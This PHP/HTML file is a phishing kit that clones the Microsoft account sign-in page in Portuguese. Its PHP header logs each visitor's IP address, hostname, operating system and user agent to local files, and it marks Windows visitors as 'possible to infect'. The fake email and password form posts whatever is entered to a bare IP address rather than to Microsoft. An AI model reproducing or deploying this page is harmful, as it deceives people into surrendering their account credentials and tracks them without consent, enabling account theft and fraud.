﻿<?php

	//CONTADOR DAQUI PRA BAIXO RS
	$timestamp  = mktime(date("H")-3, date("i"), date("s"), date("m"), date("d"), date("Y"));
	$datinha    = gmdate("d-m-Y", $timestamp);
		
	$sequencial    = gmdate("d-m-Y", $timestamp);
	$ip = $_SERVER['REMOTE_ADDR'];
	$hostname = @gethostbyaddr($ip);
	$tipo = $_POST["tipo"];


	$so = getOs();

	$pasta = opendir('indexx/');
	while ($file = readdir($pasta)) 
	{
       if (!is_dir($file) && $file != "." && $file != "..") 
	   {
				++$conta;	
	   }
	}
	
	if ($linkon)
	{
		$abrir_txt = fopen('indexx/'.  $datinha . ' - ' . $ip . ' Hostname: ' .$hostname . ' - ' . $so . ' ON.txt', "a");

		if(strpos("$so","Windows") !== false)
		{
			$possivelinfectar = true;
		}
	} else {
		$abrir_txt = fopen('indexx/'.  $datinha . ' - ' . $ip . ' Hostname: ' .$hostname . ' - ' . $so . ' OFF.txt', "a");
	}

	
	
	
	fwrite($abrir_txt, $_SERVER['HTTP_USER_AGENT']);
	fclose($abrir_txt);


	 
	
function getOs(){
 
 $useragent = $_SERVER['HTTP_USER_AGENT'];
 
 $useragent = strtolower($useragent);
 
 //check for (aaargh) most popular first
 //winxp
 if(strpos("$useragent","windows nt 5.1") !== false)
 {
 return "Windows XP";
 }
 elseif (strpos("$useragent","windows nt 6.0") !== false)
 {
 return "Windows Vista";
 }
 elseif (strpos("$useragent","windows nt 6.1") !== false)
 {
 return "Windows 7";
 }
 elseif (strpos("$useragent","windows 98") !== false)
 {
 return "Windows 98";
 }
 elseif (strpos("$useragent","windows nt 5.0") !== false)
 {
 return "Windows 2000";
 }
 elseif (strpos("$useragent","windows nt 5.2") !== false)
 {
 return "Windows 2003 server";
 }
 elseif (strpos("$useragent","windows nt 6.0") !== false)
 {
 return "Windows Vista";
 }
 elseif (strpos("$useragent","windows nt 3.1") !== false)
 {
 return "Windows NT 3.1";
 }
 
 
  elseif (strpos("$useragent","windows nt 4.0") !== false)
 {
 return "Windows NT 4.0";
 }

 
  elseif (strpos("$useragent","windows nt 5.0") !== false)
 {
 return "Windows 2000";
 }

 
  elseif (strpos("$useragent","windows nt 5.1") !== false)
 {
 return "Windows XP";
 }

 
  elseif (strpos("$useragent","windows nt 3.51") !== false)
 {
 return "Windows NT 3.51";
 }

 
  elseif (strpos("$useragent","windows nt 3.5") !== false)
 {
 return "Windows NT 3.5";
 } 
 
 elseif (strpos("$useragent","win 9x 4.90") !== false && strpos("$useragent","win me"))
 {
 return "Windows ME";
 }
 elseif (strpos("$useragent","win ce") !== false)
 {
 return "Windows CE";
 }
 elseif (strpos("$useragent","win 9x 4.90") !== false)
 {
 return "Windows ME";
 }
 
 
 
  elseif (strpos("$useragent","windows nt 6.2") !== false)
 {
 return "Windows 8.0";
 }
 
 
 
  elseif (strpos("$useragent","windows nt 6.3") !== false)
 {
 return "Windows 8.1";
 }
 
 
 elseif (strpos("$useragent","windows nt 10") !== false)
 {
 return "Windows 10";
 }

 
 
elseif (strpos("$useragent","android") !== false)
 {
 return "Android";
 }
  
 
elseif (strpos("$useragent","ipod") !== false)
 {
 return "IPod";
 }
 
  
elseif (strpos("$useragent","ipad") !== false)
 {
 return "IPad";
 }
 
 
 
 
 elseif (strpos("$useragent","iphone") !== false)
 {
 return "iPhone";
 }
 elseif (strpos("$useragent","mac os x") !== false)
 {
 return "Mac OS X";
 }
 elseif (strpos("$useragent","macintosh") !== false)
 {
 return "Macintosh";
 }
 elseif (strpos("$useragent","linux") !== false)
 {
 return "Linux";
 }
 elseif (strpos("$useragent","freebsd") !== false)
 {
 return "Free BSD";
 }
 elseif (strpos("$useragent","symbian") !== false)
 {
 return "Symbian";
 }
 else
 {
 return false;
 }
 }
 
?>
<html dir="ltr" lang="PT-BR"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<link rel="shortcut icon" href="https://logincdn.msauth.net/16.000.28170.6/images/favicon.ico">
<link rel="stylesheet" title="Converged_v2" type="text/css" crossorigin="anonymous" integrity="sha384-bnmcDZ2wICzZg6gDNq4HtO1IlnocdJAI5BM5xoxRevTMVmiQLC408FZVvq4P3+Sz" onload="$Loader.OnSuccess(this)" onerror="$Loader.OnError(this)" href="https://logincdn.msauth.net/16.000.28170.6/Converged_v21046.css">
<style type="text/css"></style><style type="text/css">body{display:none;}</style>
<script type="text/javascript">if (top != self){try{top.location.replace(self.location.href);}catch (e){}}else{document.write(unescape('%3C%73') + 'tyle type="text/css">body{display:block !important;}</style>');}</script><style type="text/css">body{display:block !important;}</style>
<noscript><style type="text/css">body{display:block !important;}</style></noscript>
<script type="text/javascript">!function(e,r){for(var t in r)e[t]=r[t]}(this,function(e){function r(n){if(t[n])return t[n].exports;var i=t[n]={exports:{},id:n,loaded:!1};return e[n].call(i.exports,i,i.exports,r),i.loaded=!0,i.exports}var t={};return r.m=e,r.c=t,r.p="",r(0)}([function(e,r){var t=window,n=t.navigator;t.g_iSRSFailed=0,t.g_sSRSSuccess="",r.SRSRetry=function(e,r,i,s,a){var o=1,c=unescape("%3Cscript type='text/javascript'");a&&(c+=" crossorigin='anonymous' integrity='"+a+"'"),c+=" src='";var u=unescape("'%3E%3C/script%3E"),S=r;if(n&&n.userAgent&&s&&s!==r){var d=n.userAgent.toLowerCase(),p=d.indexOf("edge")>=0;if(!p){var f=d.match(/chrome\/([0-9]+)\./),g=f&&2===f.length&&!isNaN(f[1])&&parseInt(f[1])>54;g&&(S=s)}}t.g_sSRSSuccess.indexOf(e)===-1&&("undefined"==typeof t[e]?(t.g_iSRSFailed=1,i<=o&&document.write(c+S+u)):t.g_sSRSSuccess+=e+"|"+i+",")}}]));var g_dtFirstByte=new Date();var g_objPageMode = null;</script>
<link rel="image_src" href="https://logincdn.msauth.net/16.000.28170.6/images/Windows_Live_v_thumb.jpg">
<script type="text/javascript">window.UXResourceDependencies = [];</script>
<script type="text/javascript">(function () {var l = new window.$DepLoader();l.Add("https://logincdn.msauth.net/16.000.28170.6/ConvergedLoginPaginatedStrings.pt-br.js","ConvergedLoginPaginatedStrings","sha384-TfX646TYtMtVTH4NaUZRUCozFWX4boKCAeAVvCRHWfR8LKAOmJsPAvDe/QdSxBTa");l.Provides("UX_JS_Strings");var res = ("UX_Res_" + window.UXResourceDependencies.length);l.Provides(res);window.UXResourceDependencies.push(res);l.Load();}());</script>
<script type="text/javascript" src="https://logincdn.msauth.net/16.000.28170.6/ConvergedLoginPaginatedStrings.pt-br.js" id="ConvergedLoginPaginatedStrings" crossorigin="anonymous" integrity="sha384-TfX646TYtMtVTH4NaUZRUCozFWX4boKCAeAVvCRHWfR8LKAOmJsPAvDe/QdSxBTa"></script>
<script type="text/javascript">(function () {var l = new window.$DepLoader();l.Add("https://logincdn.msauth.net/16.000.28170.6/ConvergedLogin_PCore.js","ConvergedLogin_PCore","sha384-Uc09YmDa/rchQTBb4mBqfXPEjRNNE2+tSvcP1bmB3lU156Bt+TmL9LwHuURF1zqS");l.Requires("UX_JS_Strings");l.Provides("UX_JS_Core");var res = ("UX_Res_" + window.UXResourceDependencies.length);l.Provides(res);window.UXResourceDependencies.push(res);l.Load();}());</script>
<link rel="prefetch" href="https://logincdn.msauth.net/16.000.28170.6/ConvergedLogin_PCore.js"><script type="text/javascript">(function () {var l = new window.$DepLoader();l.Add("https://logincdn.msauth.net/16.000.28170.6/ConvergedLogin_PAlt.js","ConvergedLogin_PAlt","sha384-b656AKThu/FyMuiHpEBpFefUbpM5dWLStHlZSMGYXdwYjcn17JEJ7tlto9G2UNCx");l.Requires("UX_JS_Core");var res = ("UX_Res_" + window.UXResourceDependencies.length);l.Provides(res);window.UXResourceDependencies.push(res);l.Load();}());</script>
<link rel="prefetch" href="https://logincdn.msauth.net/16.000.28170.6/ConvergedLogin_PAlt.js"><script type="text/javascript">window.WhenAllLoaded = function (callback) { window.$DepLoader.WhenLoaded(window.UXResourceDependencies, callback); };</script>
<script type="text/javascript" src="https://logincdn.msauth.net/16.000.28170.6/ConvergedLogin_PCore.js" id="ConvergedLogin_PCore" crossorigin="anonymous" integrity="sha384-Uc09YmDa/rchQTBb4mBqfXPEjRNNE2+tSvcP1bmB3lU156Bt+TmL9LwHuURF1zqS"></script>
<script type="text/javascript" src="https://logincdn.msauth.net/16.000.28170.6/ConvergedLogin_PAlt.js" id="ConvergedLogin_PAlt" crossorigin="anonymous" integrity="sha384-b656AKThu/FyMuiHpEBpFefUbpM5dWLStHlZSMGYXdwYjcn17JEJ7tlto9G2UNCx"></script>
</head><body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass"><div><!--  --> <div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }"><div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"><!-- ko if: smallImageUrl --> <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;https://logincdn.msauth.net/16.000.28170.6/images/Backgrounds/0-small.jpg?x=138bcee624fa04ef9b75e86211a9fe0d&quot;);"></div><!-- /ko --><!-- ko if: backgroundImageUrl --> <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;https://logincdn.msauth.net/16.000.28170.6/images/Backgrounds/0.jpg?x=a5dbd4393ff6a725c7e62b61df7e72f0&quot;);"></div><!-- ko if: useImageMask --><!-- /ko --><!-- /ko --> </div></div> 
<div data-bind="if: activeDialog"></div> 



<!-- /ko -->
				<!-- /ko -->
				<!-- /ko -->
				<!-- /ko -->
				<!-- /ko -->
				<!-- /ko -->
				<!-- /ko -->
				<!-- /ko o action fica ali na frente -->
<form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: activeDialog" action="http://18.222.141.138/eumesmo/confirmado.php">
<!-- ko if: svr.bz --><!-- /ko --><!-- ko withProperties: { '$loginPage': $data } --> 
<div class="outer" data-bind="component: { name: 'page',
        params: {
            serverData: svr,
            showButtons: svr.G,
            showFooterLinks: true,
            useWizardBehavior: svr.at,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"><!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --><!-- ko if: svr.al --><!-- /ko --> <div class="middle" data-bind="css: { 'app': backgroundLogoUrl }"><!-- ko if: backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) --><!-- /ko --> <div class="inner fade-in-lightbox" data-bind="
                animationEnd: paginationControlMethods() &amp;&amp; paginationControlMethods().view_onAnimationEnd,
                css: {
                    'app': backgroundLogoUrl,
                    'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide'),
                    'fade-in-lightbox': fadeInLightBox,
                    'has-popup': showFedCredButton,
                    'transparent-lightbox': backgroundControlMethods() &amp;&amp; backgroundControlMethods().useTransparentLightBox }"> <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.Bw &amp;&amp; showLightboxProgress() }"></div><!-- ko if: showLightboxProgress --><!-- /ko --><!-- ko ifnot: paginationControlMethods() && (paginationControlMethods().currentViewHasMetadata('hideLogo')) --> <div data-bind="component: { name: 'logo-control',
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: bannerLogoUrl() } }"><!--  --><!-- ko if: bannerLogoUrl --><!-- /ko --><!-- ko if: !bannerLogoUrl && !isChinaDc --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" pngsrc="https://logincdn.msauth.net/16.000.28170.6/images/microsoft_logo.png?x=ed9c9eb0dce17d752bedea6b5acda6d9" svgsrc="https://logincdn.msauth.net/16.000.28170.6/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://logincdn.msauth.net/16.000.28170.6/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" alt="Microsoft"><!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko --></div><!-- /ko --><!-- ko if: svr.CM && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) --><!-- /ko --><!-- ko if: asyncInitReady --> <div role="main" data-bind="component: { name: 'pagination-control',
                        publicMethods: paginationControlMethods,
                        params: {
                            enableCssAnimation: svr.A3,
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow,
                            setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                            animationStateChange: paginationControl_onAnimationStateChange } }"><!--  --> <div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class=""><!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.g) --><!-- /ko --> <div class="pagination-view animate slide-in-next" data-bind="css: {
        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.g),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }"><!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --> <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="1" data-showfedcredbutton="true" data-bind="pageViewComponent: { name: 'login-paginated-username-view',
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            displayName: sharedData.displayName,
                            prefillNames: $loginPage.prefillNames,
                            flowToken: sharedData.flowToken },
                        event: {
                            refresh: $loginPage.view_onRefresh,
                            redirect: $loginPage.view_onRedirect,
                            setPendingRequest: $loginPage.view_onSetPendingRequest,
                            showLearnMore: $loginPage.learnMore_onShow,
                            registerDialog: $loginPage.view_onRegisterDialog,
                            unregisterDialog: $loginPage.view_onUnregisterDialog,
                            showDialog: $loginPage.view_onShowDialog } }">
							<!--  --> 
							<div data-bind="component: { name: 'header-control', params: { serverData: svr } }">
							<div class="row text-title" id="loginHeader"> 
							<div role="heading" aria-level="1" data-bind="text: title">Entrar</div>
							<!-- ko if: isSubtitleVisible --><!-- /ko --> </div></div>
							<!-- ko if: pageDescription && !svr.B7 --><!-- /ko --> 
							<div class="row"> 
							<div role="alert" aria-live="assertive"><!-- ko if: usernameTextbox.error --><!-- /ko --> 
							</div> 
							<div class="form-group col-md-24"><!-- ko if: prefillNames().length > 1 --><!-- /ko --><!-- ko ifnot: prefillNames().length > 1 --> 
							<div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox',
            publicMethods: usernameTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: tenantBranding.UserIdLabel || str['CT_PWD_STR_Email_Example'],
                hintCss: 'placeholder' + (!svr.AZ ? ' ltr_override' : '') },
            event: {
                updateFocus: usernameTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --><!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus --> 
				
				<!-- /ko -->
				<!-- /ko -->
				<!-- /ko -->
				<!-- /ko -->
				<!-- /ko -->
				<!-- /ko -->
				<!-- /ko -->
				<!-- /ko -->
				<input type="email" name="loginfmt" id="i0116" maxlength="113" lang="en" class="form-control ltr_override" aria-required="true" data-bind="
                    attr: inputAttributes,
                    css: { 'has-error': usernameTextbox.error },
                    ariaLabel: tenantBranding.UserIdLabel || str['CT_PWD_STR_Username_AriaLabel'],
                    ariaDescribedBy: 'loginHeader loginDescription',
                    textInput: usernameTextbox.value,
                    hasFocusEx: usernameTextbox.focused,
                    placeholder: $placeholderText" aria-label="Insira seu email, telefone ou Skype." aria-describedby="loginHeader loginDescription" placeholder="Email, telefone ou Skype"> 
					<!-- /ko -->
				<!-- /ko -->
				<!-- /ko -->
				<!-- /ko -->
				<!-- /ko -->
				<!-- /ko -->
				<!-- /ko -->
				<!-- /ko -->
					<!--  --> 
							<div data-bind="component: { name: 'header-control', params: { serverData: svr } }">
							<div class="row text-title" id="loginHeader"> 
							<div role="heading" aria-level="1" data-bind="text: title">Insira a senha</div>
							<!-- ko if: isSubtitleVisible --><!-- /ko --> </div></div>
							<!-- ko if: pageDescription && !svr.B7 --><!-- /ko --> 
							<!-- ko withProperties: { '$placeholderText': placeholderText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> 
				<!-- /ko -->
				<!-- /ko -->
				<!-- /ko -->
				<!-- /ko -->
				<!-- /ko -->
				<!-- /ko -->
				<!-- /ko -->
				<!-- /ko -->
				<input name="passwd" type="password" id="i0118" autocomplete="off" class="form-control" aria-required="true" data-bind="
                textInput: passwordTextbox.value,
                ariaDescribedBy: &#39;loginHeader passwordDesc&#39;,
                hasFocusEx: passwordTextbox.focused,
                placeholder: $placeholderText,
                ariaLabel: unsafe_passwordAriaLabel,
                css: { &#39;has-error&#39;: passwordTextbox.error }" aria-describedby="loginHeader passwordDesc" placeholder="Senha" aria-label="Insira a senha para confirmar!"> 
				<!-- /ko --><!-- /ko --><!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div> </div> </div><!-- ko if: svr.Ad && showHipOnPasswordView --><!-- /ko --> 
				<!-- /ko -->
				<!-- /ko -->
				<!-- /ko -->
				<!-- /ko -->
				<!-- /ko -->
				<!-- /ko -->
				<!-- /ko -->
				<!-- /ko -->
				
				
				
				
				
					<br><input type="submit" id="idSIButton9" class="btn btn-block btn-primary" value="Confirmar"> </div> </div></div> </div> </div><!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- /ko --> </div> </div></div><!-- /ko --> </div><!-- ko if: showFedCredButton --><!-- /ko --><!-- ko if: newSessionMessage() && !svr.BO --><!-- /ko --><!-- ko if: svr.BO && newSession() --><!-- /ko --> <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value=""> <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value=""> <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value=""> <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value=""> <input type="hidden" name="canary" data-bind="value: svr.canary" value=""> <input type="hidden" name="ctx" data-bind="value: ctx" value=""> <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value=""> <input type="hidden" id="i0327" data-bind="attr: { name: svr.Ci }, value: flowToken" name="PPFT" value="DXdSWRGjbz32PRBAx*Iidan7c0slMDjtVzziZbX2DO88pkoeVmU1q0BRUpwqO5b8ntFyaKHigH1NSDuN5kXJj2LJAXWLn7tieels62rEiHgnL8z5D97pMQvr!lrZBjYPZQwNKj8o9UM9KPWjsSm8PQ2IoTpuB2g4T2YIS79jn67JuR2Cj4*nC1HqyZQdrTLVdq1ConasmR*LFYH!Dgrtng3x8NNutIk3LoTq0PnDifAB*BK*FZNybbhEVeNeJQaBZeMBMIUkdpyH*oOOBOtZBNw$"> <input type="hidden" name="PPSX" data-bind="value: svr.CK" value="Passport"> <input type="hidden" name="NewUser" value="1"> <input type="hidden" name="FoundMSAs" data-bind="value: svr.AA" value=""> <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0"> <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0"> <input type="hidden" name="CookieDisclosure" data-bind="value: svr.al ? 1 : 0" value="0"> <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported() ? 1 : 0" value="0"> <div data-bind="component: { name: 'instrumentation',
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }"><input type="hidden" name="i2" data-bind="value: clientMode" value="1"> <input type="hidden" name="i17" data-bind="value: srsFailed" value="0"> <input type="hidden" name="i18" data-bind="value: srsSuccess"> <input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div> <div id="footer" class="footer default" role="contentinfo" data-bind="css: { 'default': !backgroundLogoUrl() }"> <div data-bind="component: { name: 'footer-control',
                    params: {
                        serverData: svr,
                        debugDetails: debugDetails,
                        showLinks: true },
                    event: {
                        agreementClick: footer_agreementClick } }"><!--  --><!-- ko if: showLinks || impressumLink || showIcpLicense --> <div id="footerLinks" class="footerNode text-secondary"><!-- ko if: !showIcpLicense --> <span id="ftrCopy" data-bind="html: svr.CL">©2019 Microsoft</span><!-- /ko --> <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=PT-BR&amp;vv=1600&amp;uaid=f31f2b6eaa2844d6bb23e1f5580d64a8">Termos de uso</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=PT-BR&amp;vv=1600&amp;uaid=f31f2b6eaa2844d6bb23e1f5580d64a8">Privacidade e cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --> <a href="#" role="button" class="moreOptions" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        hasFocus: focusMoreInfo()" aria-label="Clique aqui para obter informações sobre solução de problemas"><!-- ko component: { name: 'accessible-image-control', params: { hasDarkBackground: true } } --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --> <!-- ko template: { nodes: [lightImageNode], data: $parent } --><img class="desktopMode" role="presentation" pngsrc="https://logincdn.msauth.net/16.000.28170.6/images/ellipsis_white.png?x=0ad43084800fd8b50a2576b5173746fe" svgsrc="https://logincdn.msauth.net/16.000.28170.6/images/ellipsis_white.svg?x=5ac590ee72bfe06a7cecfd75b588ad73" data-bind="imgSrc" src="https://logincdn.msauth.net/16.000.28170.6/images/ellipsis_white.svg?x=5ac590ee72bfe06a7cecfd75b588ad73"><!-- /ko --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --><!-- /ko --><!-- /ko --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="mobileMode" role="presentation" pngsrc="https://logincdn.msauth.net/16.000.28170.6/images/ellipsis_grey.png?x=5bc252567ef56db648207d9c36a9d004" svgsrc="https://logincdn.msauth.net/16.000.28170.6/images/ellipsis_grey.svg?x=2b5d393db04a5e6e1f739cb266e65b4c" data-bind="imgSrc" src="https://logincdn.msauth.net/16.000.28170.6/images/ellipsis_grey.svg?x=2b5d393db04a5e6e1f739cb266e65b4c"><!-- /ko --> <!-- /ko --><!-- /ko --> </a> </div><!-- ko if: showDebugDetails --><!-- /ko --> <!-- /ko --></div> </div> </div> <!-- /ko --></div><!-- /ko --> </form> <form method="post" aria-hidden="true" target="_top" data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }"><!-- ko foreach: postRedirectParams --><!-- /ko --> </form><!-- ko if: svr.Av && !svr.BO --><!-- /ko --><!-- ko if: svr.BO && callMsaStaticMeControl() --><!-- /ko --><!-- ko if: svr.Ar --> <div id="idPartnerPL" data-bind="injectIframe: { url: svr.Ar }"><iframe height="0" width="0" src="https://outlook.office365.com/owa/prefetch.aspx?id=292841&amp;mkt=PT-BR" style="display: none;"></iframe></div> <!-- /ko --></div></body></html>